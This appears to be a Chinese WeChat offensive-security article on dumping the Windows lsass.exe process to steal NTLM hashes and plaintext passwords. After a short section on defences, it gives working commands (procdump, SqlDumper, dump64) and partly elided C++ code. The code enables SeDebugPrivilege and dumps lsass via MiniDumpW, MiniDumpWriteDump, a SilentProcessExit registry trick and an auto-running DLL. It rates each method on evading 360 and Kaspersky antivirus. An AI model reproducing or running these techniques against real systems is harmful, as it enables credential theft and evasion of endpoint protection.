> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/n2R5Uv6Kxj3bN7YaLg4vHw)

前言
--

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。（本文仅用于交流学习）

基础知识
----

windows 中密码一般由两部分组成，LM Hash 与 NTLM Hash。 windows 中 Hash 的结构如下： username:RID:LM-HASH:NT-HASH

（个人版 windows Vista 以后，服务器版 windows Server 2003 以后操作系统的认证方式都为 NTLM Hash） 通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件（在域环境中，用户信息存储在 NTDS.dit 中）中获得所有用户的 Hash。也可以通过 Mimikatz 读取 lsass.exe 进程获得已登录用户的 NTLM hash 和明文值 。

简易防范： 在 WinSer12 中新增了 Protected Users 全局安全组，将需要保护的用户放入该组，便无法使用 Mimikatz 等工具抓取 Hash 值和明文密码。

安装 KB2871997: Microsoft KB2871997 的学习

注：安装 KB2871997 后，普通用户无法使用常规的 Hash 值传递攻击，但 SID 500 (Administrator) 账号依然中可以进行 Hash 传递攻击。 修改注册表禁止在内存中存储明文密码 关闭 Wdigest 功能（WinSer12 及以上版本默认关闭 Wdigest），防止用户密码在内存中以明文形式泄露。Wdigest 功能开启时，攻击者可以使用工具获取明文密码；反之，不能。 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken：默认设置为 0。如果设置为 1，则 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。

权限提升
----

SeDebugPrivilege 是调试权限的程序，开启了这个特权之后可以可以读写 system 启动的进程的内存，很显然我们想要 dump 或者 OpenProcess 下 lsass.exe 进程，那么肯定需要 SeDebugPrivilege 权限

```
whoami /priv


```

我们以普通用户开启一个 cmd 窗口进行查看，发现并没有找到 SeDebugPrivilege

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELa8WFcbIFDnaVrddmPYcQn1LfOkozBEiaAyIg3WaXqQmauT7NUKE77aJA/640?wx_fmt=png)

我们以管理员身份启动一个 cmd 窗口进行查看，显示我们想要开启 SeDebugPrivilege 特权，那么需要管理员权限

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaw8n2nP5wUzia7ZZ6XeEnNPQJQgkxk8H2xfPSo2tH1u9BkqDLj4uJhNA/640?wx_fmt=png)

如果想要更详细的说明，建议去 msdn 看官方文档，话不多说我们来看看如何开启 SeDebugPrivilege 特权

### 修改访问令牌

OpenProcessToken、LookupPrivilegeValue、AdjustTokenPrivileges 三个函数的实现，对照 msdn 文档一目了然

```
#include 
#include 

using namespace std;

void GetPrivilege() {
    HANDLE TokenHandle = NULL;

    BOOL Open = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &TokenHandle);
    if (Open != 0) {

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        BOOL Lookup = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;
        if (Lookup != 0) {

            BOOL AdjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
            if (AdjustToken != 0)
            {
                CloseHandle(TokenHandle);
                cout << "AdjustTokenPrivileges Success" << endl;
            }
            else
            {
                cout << "AdjustTokenPrivileges Error" << endl;
            }
        }
        else
        {
            cout << "LookupPrivilegeValue Error" << endl;
        }
    }
    else
    {
        cout << "OpenProcessToken Error" << endl;
    }
}

void main() {
    GetPrivilege();
    system("cmd");
}


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELa2BicZYkmBVI47icAK7RkuZIWlqfrDkKIPCKsb310ElDOTuQMSZXviaknw/640?wx_fmt=png)

### RtlAdjustPrivilege

这个函数是未公开函数，很是厉害，该函数在 ntdll.dll 这个动态链接库，因此直接动态调用即可

函数结构

```
NTSTATUS RtlAdjustPrivilege
(
        ULONG Privilege,        #权限ID
    BOOL Enable,        #True是打开，False是关闭
    BOOL CurrentThread, #True是提升当前线程权限，False是提升整个进程权限
    PULONG Enabled      #指针，内容是特权未修改的状态，最后一个参数别设置为NULL
);


```

```
#include 
#include 

using namespace std;

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled
    );

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

void main() {
    SeDebugPrivilege();
    system("cmd");
}


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaGkLcCgcDGXy4zAiaSib41q34hXslqImnTAhsOdlvKNa62lBBU4rqEUBw/640?wx_fmt=png)

接下来进入正题

### 白名单文件

#### procdump

ProcDump 是一个命令行实用工具，其主要用途是监视应用程序的 CPU 峰值，并在出现峰值期间生成故障转储，管理员或开发人员可以使用这些转储来确定峰值的原因。

因此其是自带微软签名的

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaiaqiaRzn4DerKjJFAY29Atf3tvD1hvNM2n7wzsfU6JDsws6ibsMKhRbwA/640?wx_fmt=png)

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELay7sPMicKN2icQ9ich9yGevib348otkv66P3ic8qCuZNsPPU4woE57uLicDTg/640?wx_fmt=png)

实际中 360 会直接查杀

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELazf2PgRe8q45nAtLlvrjbVh8M8UbBjjoqictovqRkicpFj5YxtuUKs87A/640?wx_fmt=png)

卡巴斯基虽然不会查杀，但是其敏感进程会拦截

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELa90wadMAyHQlqstc8NOwSltCQmdjHe0Vl8UwTGmbkprHHGBDM8No3tw/640?wx_fmt=png)

#### SQLDumper

作为 SQL External minidumper 文件，它是为在 Microsoft SQL Server 中使用而由 inFlow Inventory Software 创建的。

同样其文件具有微软的签名（360、卡巴斯基无法抓取）

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELadSolpMnBYXP1u4u1HQ2K9k6Zdp3QEqTZatDbLX3VhGBuoIsdlYV3DA/640?wx_fmt=png)

```
tasklist /svc | findstr "lsass.exe"

SqlDumper.exe pid 0 0x01100


```

#### dump64

这个是 Visual Studio 中自带的，因此也是具有微软的签名

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELa0s6ibtRVpXd0aHORmIPQiaYqdhnqPfEvsjzSKUMopa8ufd52Licw0edgQ/640?wx_fmt=png)

```
dump64.exe pid d:\a.dmp


```

卡巴斯基无法导出文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaLLjCEkiaG0sPr6yfjfnY4ZB6uEzfIBicWk1qEkEZiad7sv34q7uQEMQbQ/640?wx_fmt=png)

360 直接拦截

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELacY723tbSHsz8Dh5puV5gZJjLSFH0MXG657vCQG4EQo5OHGmYKLZeFA/640?wx_fmt=png)

#### DumpMinitool.exe

推特上大哥分享的 LOLBIN，Visual Studio 中自带的程序 路径

```
C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions


```

卡巴斯基过不了 除了白名单我们还可以直接利用函数来实现 dump

#### MiniDumpW

comsvcs.dll 转储 MiniDumpW，MiniDumpW 是 comsvcs.dll 中的函数

```
dumpbin /exports C:\Windows\System32\comsvcs.dll


```

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELavwKvzwEBjc2pRcoOsxDKU3v267AkL7vtvuGnhrlbZTMZZ7icgZvPgEg/640?wx_fmt=png)

#### 代码实现

通过 CreateToolhelp32Snapshot 函数对所有进程进行快照的拍摄 利用 RtlAdjustPrivilege 函数对进程进行权限提升 利用 Process32First、Process32Next 函数，遍历拍摄的快照，寻找 lsass.exe 进程，获得其 Pid 动态调用 MiniDumpW 函数进行 dump 很明了了，根据 msdn 文档对照即可实现

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

...............................
...............................
...............................

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int main(int argc, char* argv[]) {

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);
        ...............................
        ...............................
    ...............................
    cout << "MiniDumpW Success" << endl;
    cout << "C:\\Windows\\Temp\\" << a << endl;

    return 0;
}


```

卡巴斯基无法导出文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaeRWCDwV7rDrxYUDt8s873cMx42sfa5Hgb28eAMna5Uh8PBvTflweTQ/640?wx_fmt=png)

360 核晶无法导出完整文件

#### MiniDumpWriteDump

函数参考官方手册，很简单一目了然

> https://learn.microsoft.com/zh-cn/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump

#### 代码实现

*   通过 CreateToolhelp32Snapshot 函数对所有进程进行快照的拍摄
    
*   利用 RtlAdjustPrivilege 函数对进程进行权限提升
    
*   利用 Process32First、Process32Next 函数，遍历拍摄的快照，寻找 lsass.exe 进程，获得其 Pid
    
*   OpenProcess 函数获得 lsass.exe 进程的句柄
    

然后利用 MiniDumpWriteDump 函数从内存中进行 dump

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

#pragma comment( lib, "DbgHelp.lib" )

typedef NTSTATUS(WINAPI* _RtlAdjustPrivilege)(
    ULONG Privilege, BOOL Enable, BOOL CurrentThread, PULONG Enabled
    );

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int main() {

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);

    ...............................
        ...............................
    ...............................

    SeDebugPrivilege();
    HANDLE Open_Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    ...............................
        ...............................
    ...............................
    if (isDumped == TRUE) {
        cout << "Success" << endl;
    }
    else
    {
        cout << "MiniDumpWriteDump Error" << endl;
    }

    return 0;
}


```

对于卡巴斯基任然无法导出

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELacOfMCCF16OJ96etqNdXf9duID0K1kgudgrfvF7vEegRItBxwgXTRTw/640?wx_fmt=png)

360 核晶无法导出完整文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaycUd1tj2zFfArLMaWlvlvC7M47VySARqKaKHG9AkFSjnKWuicVqh3fA/640?wx_fmt=png)

#### RtlReportSilentProcessExit 静默退出

之前有个操作就是利用蓝屏崩溃来进行转储绕过卡巴斯基进行 dump，但是把对方电脑都弄蓝屏了这显示不实用。 在 win7 之后，windows 引入了一些进程退出的相关机制，即 Selftermination 的 ExitProcess. 与 Crossprocesstermination 的 TerminateProcess. 这次利用的就是 Silent Process Exit（静默退出）。

我们可以调用 ntdll.dll 的 RtlReportSilentProcessExit() 函数，我们可以利用其进行转储文件又不会导致程序崩溃（因为 lsass 进程崩溃可能会导致电脑重启）

我们首先要在注册表中设置如下（有点像 IFEO 是吧）

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option\
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\


```

其中 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option \ 的 GlobalFlag 键设置为 FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaW74YGUpJHhOayPAiczoG28rhLg3CNbn0WHIKehI5UUiaI1H0aj3uOEeQ/640?wx_fmt=png)

在 HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit 项下设置三个属性

详细参考 MSDN（非常的详细了）

> https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit

```
ReportingMode (REG_DWORD) 需要执行的操作
* LAUNCH_MONITORPROCESS (0x1) – 启动一个监控进程
* LOCAL_DUMP (0x2) – 为导致终止的进程和被终止的进程创建转储文件
* NOTIFICATION (0x4) – 显示弹出通知
LocalDumpFolder(REG_SZ) 转储文件保存的路径
DumpType(REG_DWORD)转储文件类型


```

#### 代码实现

通过 RegCreateKeyExA、RegSetValueExA 函数设置好上述两个注册表

```
#include 
#include 
#include 
#include 
#include 
#include 

using namespace std;

    ...............................
        ...............................
    ...............................

_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlAdjustPrivilege");

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

int Get_Pid() {
    HRESULT hr;

    DWORD pid;
    PROCESSENTRY32 ed;
    ed.dwSize = sizeof(PROCESSENTRY32);

    ...............................
        ...............................
    ...............................

    if (RegCreate == ERROR_SUCCESS) {

        cout << "RegCreateKeyExA Success" << endl;

        DWORD GlobalFlag = 0x200;
        LSTATUS RegSetValue_GlobalFlag = RegSetValueExA(phkResult, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&GlobalFlag, sizeof(DWORD));

    ...............................
        ...............................
    ...............................

            if (RegSetValue_ReportingMode == ERROR_SUCCESS && RegSetValue_LocalDumpFolder == ERROR_SUCCESS
                && RegSetValue_DumpType == ERROR_SUCCESS) {

                cout << "RegSetValue_All Success" << endl;
            }
            else
            {
                cout << "RegSetValue_One Error" << endl;
            }

            }
        else
        {
            cout << "RegCreateKeyExA SilentProcessExit Error" << endl;
        }
    }
    else
    {
        cout << "RegCreateKeyExA Error" << endl;
    }

    return 0;
}

int main(int argc, char* argv) {

    Reg_Set();
    DWORD pid = Get_Pid();
    cout << "Lsass Pid is:" << pid << endl;

    ...............................
        ...............................
    ...............................

        cout << "Path：C:\\tmp" << endl;
    }
    else {
        cout << "OpenProcess Error" << endl;
    }

    return 0;
}


```

360 会检测其对注册表的操作

卡巴斯基同样无法导出

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELa3S76UXEYfxksdaD4ia0gye0ciabIYjc0QR6emcB3dp8se9DuAE8bl8wQ/640?wx_fmt=png)

### 通过 Dll 加载

具体实现都差不多，只不过写在了 Dll 里面

#### 代码实现

```
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <DbgHelp.h>

#pragma comment( lib, "DbgHelp.lib" )

...............................
...............................
...............................

//获取SeDebugPrivilege,最后一个参数别设置为NULL
int SeDebugPrivilege() {
    ULONG t;
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
    if (RtlAdjustPrivilege == NULL) {
        cout << "Unable to resolve RtlAdjustPrivilege.\n" << endl;
        return 0;
    }

    cout << "RtlAdjustPrivilege Success" << endl;
}

void Dump() {

    DWORD pid;
    DWORD gid;
    PROCESSENTRY32 ed;
    ...............................
        ...............................
    ...............................

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Dump();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


```

卡巴斯基过不了

最后
--

本篇只是列出了一些常规的方法，还有一些方法没有介绍到比如 ssp 等 最后

![](https://mmbiz.qpic.cn/mmbiz_png/ibZ6uZjjH3v6H3ibOE62qTBfMBzsQMibELaDu01dtW4FCBN66gYgKUibJQt1wIa1cXqjfv8icxMqoicQEzgwic7QVaKyA/640?wx_fmt=png)

卡巴斯基也是一样

**文章来源于：https://forum.butian.net/share/2094**

**若有侵****权请联系删除**

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibZ6uZjjH3v4WZgYJeibL4XoXol2MibfTeNPUTuUmqkgMFFf3icptn2CEN5kJEOOPWMg7STl235fSLQMgQ8GuSmWSg/640?wx_fmt=jpeg)

往期推荐

[

域内令牌窃取



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506691&idx=1&sn=ac9f19fbc2155c032a02d75c065b6f75&chksm=ce6761bff910e8a9ba231adfce7b847116d3eb760fb702c3cce0de98e6edd308567ac827e7ba&scene=21#wechat_redirect)

[

最简单绕过 ring3 hook 的方式（bypass bitdefender）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506674&idx=1&sn=09e05891a69e9b2a9c5cf53893a15ab8&chksm=ce67604ef910e95855c426fbfa60d95528d6ee79c24e7125e8673ea81112150f122db16bad2d&scene=21#wechat_redirect)

[

域内定位个人 PC 的三种方式



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506246&idx=1&sn=dee60e5e6a859f8679f5f131d7a26db6&chksm=ce6763faf910eaec76028bad4f8c9b1ebf69836562d64b9e65528fb577ae3d852f3f9bbcc8d6&scene=21#wechat_redirect)

[

基于资源的约束委派（RBCD）



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506155&idx=1&sn=9f42794f32d4210b16da8ed7734015d4&chksm=ce676257f910eb41a0c9749709ae10b8012bf69e8f25625440b284d831013fd0c48a0e7a039b&scene=21#wechat_redirect)

[

syscall 的检测与绕过



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247505816&idx=1&sn=621788407279fb5351fff3b5c725adfd&chksm=ce676d24f910e432cf03edc058c68c2202d6a4e890f70ac3996f4255011344b1954ec9c8ee17&scene=21#wechat_redirect)

[

DLL 劫持之 IAT 类型



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247506149&idx=1&sn=9059fa64c657c82ba679a237602f3b40&chksm=ce676259f910eb4f1a2c76088a92581a546133838f24ec7a231a97cdfab3d7e31f1a38783d9f&scene=21#wechat_redirect)

[

patchless amsi 学习



](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247505779&idx=1&sn=7a5c79f8f961accc46000ca0c8a60c64&chksm=ce676dcff910e4d961e903988cd3490a0c7bf673e0cee4e85b8623a4474b9a2b13510062b80b&scene=21#wechat_redirect)

[绕过 windows defender 上线 cs](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504303&idx=1&sn=7716a681734b6841023982e670efd47d&chksm=ce676b13f910e205e297694a7bc960f71f615a8a8663409b79bdad1650b71496fcf36d40244f&scene=21#wechat_redirect)

    ![](https://mmbiz.qpic.cn/mmbiz_gif/ibZ6uZjjH3v7LQZwTb4qED3KvozKicnJd9ejpVoCntCRqf53IiaK2T3myzcUn5sswkUPfpQj1KHAALFcMFNYjfriaw/640?wx_fmt=gif)